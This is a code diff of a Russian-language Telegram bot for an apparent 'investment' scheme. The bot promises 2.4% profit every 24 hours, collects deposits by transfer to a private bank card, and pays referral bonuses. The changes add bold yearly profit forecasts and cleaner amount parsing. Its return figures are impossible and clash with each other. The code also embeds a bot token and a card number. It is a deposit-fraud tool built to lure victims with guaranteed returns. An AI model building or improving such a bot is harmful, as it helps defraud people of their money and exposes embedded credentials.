@@ -13,7 +13,7 @@ import re
 # ========== НАСТРОЙКИ ==========
 TOKEN = "8587086312:AAE9jbbaPZBzU-niDmOK7uhHhpCYSvf_BoU"
 ADMIN_ID = 7603296347
-SUPPORT_USERNAME = "CryptoDripClubaD"  # ✅ ИЗМЕНЕНО
+SUPPORT_USERNAME = "CryptoDripClubaD"
 CARD_NUMBER = "2200 7012 3329 6489"
 CARD_HOLDER = "Леонид К."
 
@@ -38,10 +38,7 @@ SHOW_WITHDRAW_IN_CHANNEL = True
 RENDER_EXTERNAL_URL = os.environ.get('RENDER_EXTERNAL_URL')
 PORT = int(os.environ.get('PORT', 10000))
 WEBHOOK_PATH = f'/webhook/{TOKEN}'
-if RENDER_EXTERNAL_URL:
-    WEBHOOK_URL = f'{RENDER_EXTERNAL_URL}{WEBHOOK_PATH}'
-else:
-    WEBHOOK_URL = None
+WEBHOOK_URL = f'{RENDER_EXTERNAL_URL}{WEBHOOK_PATH}' if RENDER_EXTERNAL_URL else None
 # ========================================
 
 bot = Bot(token=TOKEN)
@@ -192,7 +189,7 @@ async def cmd_start(message: Message):
         [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
          InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
         [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
-         InlineKeyboardButton(text="📈 Проценты", callback_data="interest_info")],
+         InlineKeyboardButton(text="📈 Проценты", callback_data="interest")],
         [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"),
          InlineKeyboardButton(text="📊 История", callback_data="history")],
         [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
@@ -226,6 +223,7 @@ async def show_balance(call: CallbackQuery):
     
     profit_week = calculate_profit(invest, 7)
     profit_month = calculate_profit(invest, 30)
+    profit_year = calculate_profit(invest, 365)
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
@@ -238,7 +236,8 @@ async def show_balance(call: CallbackQuery):
         f"🎁 Реферальные: `{ref_earnings:,.0f}₽`\n\n"
         f"📅 *Прогноз дохода:*\n"
         f"• Через неделю: `+{profit_week:,.0f}₽`\n"
-        f"• Через месяц: `+{profit_month:,.0f}₽`\n\n"
+        f"• Через месяц: `+{profit_month:,.0f}₽`\n"
+        f"• Через год: `+{profit_year:,.0f}₽`\n\n"
         f"⏳ Каждые 24 часа +2,4% 🔥",
         parse_mode="Markdown",
         reply_markup=keyboard
@@ -444,14 +443,14 @@ async def confirm_deposit(message: Message):
     
     await add_history(user_id, "deposit", amount, "completed", "Пополнение подтверждено")
     
-    await message.answer(f"✅ Баланс {user_id} пополнен на {amount:,.0f}₽")
+    await message.answer(f"✅ Баланс пользователя {user_id} пополнен на {amount:,.0f}₽")
     await bot.send_message(
         user_id,
         f"✅ *Баланс пополнен!*\n💰 {amount:,.0f}₽\n🚀 Запускай в работу!",
         parse_mode="Markdown"
     )
 
-# === УМНОЖИТЬ ДЕНЬГИ ===
+# === УМНОЖИТЬ ДЕНЬГИ (ЗАПУСК В РАБОТУ) ===
 @dp.callback_query(lambda c: c.data == "multiply")
 async def multiply_start(call: CallbackQuery):
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -460,25 +459,37 @@ async def multiply_start(call: CallbackQuery):
     
     await call.message.edit_text(
         "💰 *ЗАПУСК В РАБОТУ*\n\n"
-        f"💸 Введи *сумма — например: *500, *1.5k\n"
-        f"• Мин. сумма: {MIN_INVEST}₽\n"
-        f"• Доход: 2,4% каждые 24 часа\n\n"
-        f"📅 *Прогноз:*\n"
-        f"500₽ → +84₽ за месяц\n"
-        f"1000₽ → +168₽ за месяц",
+        f"💸 *Как запустить:*\n"
+        f"• Напиши `*1000` — 1000₽ в работу\n"
+        f"• Напиши `*1.5k` — 1500₽ в работу\n"
+        f"• Напиши `*2K` — 2000₽ в работу\n\n"
+        f"💰 Минимум: {MIN_INVEST}₽\n"
+        f"📈 Доход: 2,4% каждые 24 часа\n\n"
+        f"📅 *Прогноз с 1000₽:*\n"
+        f"• За месяц: +268₽\n"
+        f"• За год: +13 400₽\n\n"
+        f"👇 *Отправь сообщение со звёздочкой*",
         parse_mode="Markdown",
         reply_markup=keyboard
     )
 
-@dp.message(lambda m: m.text and m.text.lower().startswith('*'))
+@dp.message(lambda m: m.text and m.text.strip().startswith('*'))
 async def process_multiply(message: Message):
     user_id = message.from_user.id
-    text = message.text.replace('*', '').strip()
+    text = message.text.strip().replace('*', '').replace(' ', '')
+    
+    if not text:
+        await message.answer("❌ Напиши сумму после звёздочки. Например: `*500`")
+        return
     
     try:
         amount = parse_amount(text)
     except:
-        await message.answer("❌ Используй: *500, *1.5k, *2K")
+        await message.answer("❌ Неверный формат. Используй: *500, *1.5k, *2K")
+        return
+    
+    if amount < MIN_INVEST:
+        await message.answer(f"❌ Минимальная сумма — {MIN_INVEST}₽")
         return
     
     db = await get_db()
@@ -487,11 +498,7 @@ async def process_multiply(message: Message):
     balance = row[0] if row else 0
     
     if amount > balance:
-        await message.answer(f"❌ Недостаточно. Баланс: {balance:,.0f}₽")
-        return
-    
-    if amount < MIN_INVEST:
-        await message.answer(f"❌ Минимум {MIN_INVEST}₽")
+        await message.answer(f"❌ Недостаточно средств. Баланс: {balance:,.0f}₽")
         return
     
     await db.execute(
@@ -503,14 +510,18 @@ async def process_multiply(message: Message):
     
     profit_week = calculate_profit(amount, 7)
     profit_month = calculate_profit(amount, 30)
+    profit_year = calculate_profit(amount, 365)
     
     await message.answer(
         f"✅ *ГОТОВО!*\n\n"
-        f"💸 {amount:,.0f}₽ в работе\n"
+        f"💸 `{amount:,.0f}₽` запущены в работу\n"
         f"📈 Каждые 24 часа +2,4%\n\n"
-        f"📅 *Прогноз:*\n"
-        f"• Неделя: +{profit_week:,.0f}₽\n"
-        f"• Месяц: +{profit_month:,.0f}₽",
+        f"📅 *Твой прогноз:*\n"
+        f"• Неделя: `+{profit_week:,.0f}₽`\n"
+        f"• Месяц: `+{profit_month:,.0f}₽`\n"
+        f"• Год: `+{profit_year:,.0f}₽`\n\n"
+        f"💰 Баланс: `{balance - amount:,.0f}₽`\n"
+        f"📊 В работе: `{amount:,.0f}₽`",
         parse_mode="Markdown"
     )
 
@@ -652,7 +663,7 @@ async def confirm_withdraw(message: Message):
     )
 
 # === ПРОЦЕНТЫ ИНФО ===
-@dp.callback_query(lambda c: c.data == "interest_info")
+@dp.callback_query(lambda c: c.data == "interest")
 async def interest_info(call: CallbackQuery):
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
@@ -666,7 +677,8 @@ async def interest_info(call: CallbackQuery):
         f"✨ *Пример:*\n"
         f"1000₽ → 1024₽ (день)\n"
         f"→ 1181₽ (неделя)\n"
-        f"→ 2050₽ (месяц)\n\n"
+        f"→ 2050₽ (месяц)\n"
+        f"→ 65 000₽ (год)\n\n"
         f"💰 Вывод от {MIN_WITHDRAW}₽",
         parse_mode="Markdown",
         reply_markup=keyboard
@@ -781,7 +793,7 @@ async def back_to_menu(call: CallbackQuery):
         [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
          InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
         [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
-         InlineKeyboardButton(text="📈 2,4%", callback_data="interest_info")],
+         InlineKeyboardButton(text="📈 Проценты", callback_data="interest")],
         [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"),
          InlineKeyboardButton(text="📊 История", callback_data="history")],
         [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
@@ -799,19 +811,16 @@ async def back_to_menu(call: CallbackQuery):
 
 # === ЗАПУСК ЧЕРЕЗ ВЕБХУКИ ===
 async def on_startup():
-    """Действия при старте"""
     if WEBHOOK_URL:
         await bot.set_webhook(WEBHOOK_URL, allowed_updates=dp.resolve_used_update_types())
     await init_db()
     asyncio.create_task(interest_worker())
 
 async def on_shutdown():
-    """Действия при остановке"""
     await bot.delete_webhook()
     await close_db()
 
 def main():
-    """Запуск через aiohttp"""
     app = web.Application()
     
     dp.startup.register(on_startup)
